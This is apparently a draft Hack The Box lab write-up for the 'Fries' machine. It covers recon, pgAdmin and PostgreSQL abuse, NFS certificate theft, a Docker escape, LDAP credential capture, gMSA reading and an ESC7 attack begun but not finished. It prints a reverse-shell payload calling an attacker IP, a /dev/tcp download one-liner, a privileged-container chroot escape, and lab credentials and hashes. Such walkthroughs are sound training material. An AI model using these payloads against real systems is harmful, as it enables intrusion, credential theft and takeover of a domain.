---
title: 'HTB-Fries'
published: 2025-11-25
draft: true
toc: true
tags: ["ffuf", "vhosts", "docker", "docker-escape", "PostgreSQL", "nfs", "PWM", "BloodHound", "ReadGMSAPassword", "ESC7"]
---

```
Scope:
10.10.11.96

Creds:
d.cooper@fries.htb
D4LE11maan!!
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -p- -vvvv -T5 --min-rate=5000 -Pn fries.htb

PORT      STATE SERVICE       REASON  VERSION
22/tcp    open  ssh           syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-title: Welcome to Fries - Fries Restaurant
|_http-server-header: nginx/1.18.0 (Ubuntu)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-11-23 02:02:57Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-23T02:04:36+00:00; +1h59m20s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Issuer: commonName=fries-DC01-CA/domainComponent=fries
443/tcp   open  ssl/http      syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
|_http-title: Site doesnt have a title (text/html;charset=ISO-8859-1).
| ssl-cert: Subject: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP/organizationalUnitName=PWM Configuration/emailAddress=web@fries.htb/localityName=Madrid
| Issuer: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP/organizationalUnitName=PWM Configuration/emailAddress=web@fries.htb/localityName=Madrid
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
2179/tcp  open  vmrdp?        syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49685/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         syn-ack Microsoft Windows RPC
49688/tcp open  msrpc         syn-ack Microsoft Windows RPC
49689/tcp open  msrpc         syn-ack Microsoft Windows RPC
49913/tcp open  msrpc         syn-ack Microsoft Windows RPC
49946/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-23T02:03:54
|_  start_date: N/A
|_clock-skew: mean: 1h59m19s, deviation: 1s, median: 1h59m19s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46245/tcp): CLEAN (Timeout)
|   Check 2 (port 47430/tcp): CLEAN (Timeout)
|   Check 3 (port 23943/udp): CLEAN (Timeout)
|   Check 4 (port 21385/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

## 443/TCP - HTTPS

![](attachments/18cda2d3646529a4c4360e460512e8e4.png)

When trying to log in using the provided `ldap` creds we get the following message:

![](attachments/3893290f92756894ee67aa6132312e97.png)

We notice a new username *svc_infra*.

I also found that the Password Manager is an open-source project called `pwm`:

![](attachments/2813c9f4bac2334ad04ab7f89fd683d2.png)

![](attachments/6c3503610d7bbe8aa863a8e07fe0174f.png)

It seems that the latest version from february 2025 is installed.

Other than that there doesn't seem to be more going on for us.

## 80/TCP - HTTP

Over here I found a static website with nothing else really. 

![](attachments/7716f3a0e1e96464a199787a869a20ea.png)

### code.fries.htb

I decided to use `ffuf` to enumerate vhosts:

![](attachments/58b0f8d65d9d22664c6b9898f3a57ada.png)

![](attachments/08158d7ab32be8756ac96752d4f29391.png)

![](attachments/eaaba866d908b41999deae9b4e8b111b.png)

Here I was able to log in with the provided creds:

![](attachments/f070ca1667060dcd9cebb881f0e972ca.png)

![](attachments/5919d552dfd283f345ef943210aa249a.png)

I headed over to the repo and started analysing it.

![](attachments/2592ab9007e5947fa04445738204a412.png)

Inside the initial commit I found the credentials for `postgresql`:

![](attachments/06e2e228acd0cceb3e5059a4b12c2016.png)

```
root
PsqLR00tpaSS11
```

And perhaps the secret key could be reused somewhere:

```
y0st528wn1idjk3b9a
```

I then found the following inside the `README.md` 

![](attachments/792f2e4d46ea11958565b4d5f6216d6a.png)

Another vhost:

```
db-mgmt05.fries.htb
```

![](attachments/689785d8dc8e2439713abf6d1ae289f4.png)

### db-mgmt05.fries.htb

I headed over to the db instance:

![](attachments/eb8f4d4fba50e3851c6534a0dac1349e.png)

Here again I logged in with the creds for *dale*:

![](attachments/4d173af8649aeed967762e9bff9ed31a.png)

When trying to connect to the server we're prompted the following:

![](attachments/ab3bf8d13ca1d2db25f43d1f32ff744b.png)

We enter the previously found root password here and get access:

![](attachments/0df1780a7922488f40b029f4c2b64d5e.png)

I expanded it and checked the `gitea` database:

![](attachments/18e93b8b9305e19afc027c762b699026.png)

Here I right clicked on the `user` table to view all the rows:

![](attachments/5d35ceb7f5b7b0570fbc259a9f4818bc.png)

![](attachments/b399640c9df7dca5d389d41ee839cbdb.png)

I tried cracking the *Administrator* password but this did not work.

# Docker Foothold - RABBITHOLE
## RCE via PostGreSQL UI

I tried out some queries and noticed I had file read

![](attachments/c4638f7725e315cee662821147682c91.png)

And even file write!

![](attachments/48a9ae7402c59e7cf3eac265aee6b681.png)

I then tried to see whether I had command execution:

![](attachments/3a1e7b40e013ed99a77c33bef157f0f2.png)

Since all of the above worked I went ahead and tested a reverse shell payload.

```sql
CREATE TABLE cmd_out3(line text);
COPY cmd_out3 FROM PROGRAM '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.42/80 0>&1"';
SELECT * FROM cmd_out3;
```

![](attachments/51d3951091db2df27dfa148e26ea96d8.png)

![](attachments/a16ec76f87e6a9c442d12cb9a43b4eda.png)

I now finally had a shell inside the Linux docker container.

###I Living Off The Land ( LOTL )

I tried to copy over some files using `wget` or `curl` but none were available:

![](attachments/60466f23f6bac805fb9cb42eaf710cc2.png)

Instead I looked on [GTFObins](https://gtfobins.github.io/gtfobins/bash/) for some **Living Off The Land (LOTL)** commands:

![](attachments/cadd13ea548386091749ac94510b11ad.png)

I used it to transfer various files:

```bash
export RHOST=10.10.14.126
export RPORT=8000
export LFILE=<FILENAME HERE>
bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$RHOST/$RPORT \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
```

![](attachments/ef183a42283c5d8ddcc92ae6b7e67ce8.png)

## Enumeration
### linpeas

I ran `linpeas` in order to enumerate the environment and find out what I could do here.

![](attachments/a99df4576e7dd6432ad31b4457560546.png)

Some findings included:

![](attachments/b3f02283ccccb7e46876e312332bbc1b.png)

Unfortunately other than that I didn't find anything useful so instead booted up `ligolo` in order to scan the network.

# Linux Foothold
## CVE-2025-2945

I started looking further and realized I landed inside a *rabbithole*. Instead I searched up the version of the `pgadmin` instance and found a CVE for it:

![](attachments/477bf4518c8a65aa70a3775295466b09.png)

But the above PoC didnt work since it didn't work with kerberos auth. Instead I used the `metasploit` module it's based upon:

![](attachments/39a109cdeaaa2eba2b4d5101a89c82b0.png)

Once I put down the following options I was able to run it successfully:

![](attachments/2073670b00fa9da3db708deaebadf801.png)

![](attachments/e0c40b540ffa8b3c04c57590b05e01ee.png)

I started enumerating the directory:

![](attachments/791741f6ad5bf6c8cd22ade35784c600.png)

From here I enumerated the `env` variables where I found a cleartext password:

![](attachments/1f4956f4ee7996e336f2dffba482d7d1.png)

```
Friesf00Ds2025!!
```

Next up I tried spraying this password against found users until I found one that matched:

![](attachments/057666a6311a1b2713a5cc5f72b68185.png)
## SSH Access

Using these creds I logged in:

![](attachments/f3e3882e4ef6853c6a37bd533709d2d9.png)
### Mounting NFS Share

I used `ligolo` to port forward so I could access the `nfs` service:

![](attachments/33bd1b7799e8522d15da5aa1de7cf554.png)

Once I had the port forward set up I created the drive I would mount the share

```bash
sudo mkdir ./mount
sudo mount -t nfs -o ro,soft,timeo=10 240.0.0.1:/srv/web.fries.htb/certs ./mount
```

![](attachments/13c5ab0834f9ece290b9d61e55fe171d.png)

![](attachments/d414fba4ddd5c74e5b83d6f9682012bb.png)

I could still not access the mount though becaues I did not have the proper GUID:

![](attachments/b20bb4836dee5b30ecbeba272072735d.png)

In order to get access I had to create a "dummy" account with this GUID.

```bash
sudo useradd tester
sudo nano /etc/passwd

# Add the following GUID
tester:x:1001:59605603::/home/tester:/bin/sh
```

![](attachments/971f1ed1fb5a0f1a147fe457ea20f50a.png)

Now we should be able to access the mounted share.

```bash
sudo -u tester cp -r mount /tmp/mount
sudo chown kali /tmp/mount
sudo chown kali /tmp/mount/*
sudo umount ./mount
```

![](attachments/fbfa52ab7fc6c9b670983d50e116d9a8.png)

![](attachments/01a09fdc3527203df54962aebfb1df00.png)

### Crafting certificate

For the following steps I'll craft a certificate where `CN=root`:

```bash
cat > root.cnf
[ req ]
distinguished_name = req_distinguished_name
prompt = no

[ req_distinguished_name ]
CN = root
```

Next I will cuse the following commands:

```bash
openssl genrsa -out key.pem 2048
openssl req -new -key key.pem -out root.csr -config root.cnf
```

![](attachments/2d7ff9f48ca2542b36011730591ba8ab.png)

Now we create the `cert.pem` certificate:

```bash
openssl x509 -req -in root.csr \
  -CA ca.pem -CAkey ca-key.pem -CAcreateserial \
  -out cert.pem -days 365 -sha256
```

### Docker

We will now have to use the following commands to spin up the docker container:

```bash
docker context create fries \
  --docker host=tcp://240.0.0.1:2376 \ 
  --docker ca=/home/kali/Fries/ca.pem \
  --docker cert=/home/kali/Fries/cert.pem \
  --docker key=/home/kali/Fries/key.pem \
  --docker skip-tls-verify=true
  
  
docker context use fries
```

![](attachments/3c71f9e7fb1b7c48048fa421ddf2e3d0.png)

We can check it out:

![](attachments/c828650696f33e59b4285b5a40a298b3.png)

Looks good!

# Linux Privilege Escalation

We can simply use the following command to to give ourselves a *root* shell on the system:

```bash
docker run -it --rm --privileged --net=host --pid=host -v /:/mnt 616e340baeac bash -c "chroot /mnt /bin/bash || chroot /mnt /bin/sh"
```

![](attachments/1e9944ddb45cbd53929591c810ac1bf0.png)

### user.txt

Finally we're able to grab the `user.txt` flag:

![](attachments/7b5bc0affdd96b6763fbe46390a5ea1e.png)

## Post-Exploitation
### PWM Config

During post-exploitation I stumbled on this hash which I then cracked:

![](attachments/8ddafdd654bf9b6670196f0084e60dbf.png)

![](attachments/4b1f855eb72b9ef11a7c72c2e24896a5.png)

```
rockon!
```

This password can then be used to access the `pwm` Configuration Manager:

![](attachments/60514627a34fc5302b1fbb82f2718189.png)

![](attachments/5a9290ef9d6b2ee1711fe6ec5af403ba.png)

I clicked on **Download Configuration**:

![](attachments/3e229ce1066e2d96ddc6bb2ad93efe0c.png)

This was the same exact config however. Instead I headed over to the **Configuration Editor** where I headed over to **LDAP** -> **LDAP Directories** -> **default** -> **Connection**:

![](attachments/6a0eb105859834aecc356f1a55c4d960.png)

Here I changed the **LDAP URLs** to my own URL:

![](attachments/a1590bdd4f9cdeb998fb648fe811b980.png)

And clicked **Test LDAP Profile**. I then captured the cleartext password using `responder`:

![](attachments/ea5807842a9589b544feb28d3b27e3d4.png)

```
svc_infra
m6tneOMAh5p0wQ0d
```

# DC01 Enumeration
## BloodHound

Now that I had a valid set of creds I checked their validity via NTLM logon:

![](attachments/3462f3ef3a93522f0e27261445140dbd.png)

This meant I didn't need `kerberos` login, let's use `bloodhound` to enumerate the system:

![](attachments/41ba7e3476e8a3df696ea6409b5ee3f4.png)

I started up `bloodhound` and went to work.

![](attachments/3e0e7116f4d80528ca5e2577df936284.png)

### ReadGMSAPassword

Here I noticed the following:

![](attachments/61f297fa737975203dd94e7ce9e6612e.png)

This is pretty straightforward to exploit using `nxc`:

```bash
nxc ldap fries.htb -u usernames.txt -p passwords.txt --gmsa
```

![](attachments/d09018725fdb015bcc2fe9c84425c24a.png)

And we get the NTLM hash for *gMSA_CA_prod$*.

```
fc20b3d3ec179c5339ca59fbefc18f4a
```

I checked the account information where I found the following:

![](attachments/3047996bfe96826c6048da7aa01d2bb2.png)

# DC01 Privilege Escalation
## ADCS - ESC7

I requested a TGT for the found user:

```bash
impacket-getTGT 'fries.htb/gMSA_CA_prod$' -hashes :fc20b3d3ec179c5339ca59fbefc18f4a -dc-ip 10.10.11.96
```

![](attachments/9ee94a31f46c3d5bf8faf9b2982d27ce.png)

I then used `certipy-ad` to enumerate the ADCS vulnerabilities:

```bash
certipy-ad find -k -dc-ip 10.10.11.96 -target DC01.fries.htb -stdout -vulnerable
```

![](attachments/f7b27a2575739311a9664ee27ae4500d.png)

It looks like the target is vulnerable to **ESC7**.

### Exploitation

First of all we'll have to modify the `/etc/krb5.conf` file:

![](attachments/3f90f523af43db8636eaed6b59658c30.png)

![](attachments/6aeaa356337910910a060d8525f6ea86.png)

To exploit this we can use the following commands:

```bash
certipy-ad ca \
  -ca fries-DC01-CA \
  -add-officer 'gMSA_CA_prod$' \
  -dc-ip 10.10.11.96 \
  -dc-host DC01.fries.htb \
  -target DC01.fries.htb \
  -k
```

![](attachments/8e917acb5f5b0818799a986aa5b9c620.png)

We will now have to update the templates by adding the `SubCA` template: 

```bash
certipy-ad template \                                                                                              
  -template SubCA \
  -save-configuration subca.json \
  -dc-ip 10.10.11.96 \
  -dc-host DC01.fries.htb \
  -target DC01.fries.htb \
  -k
```

![](attachments/cb6b659413494455d9d9d394e1116585.png)

---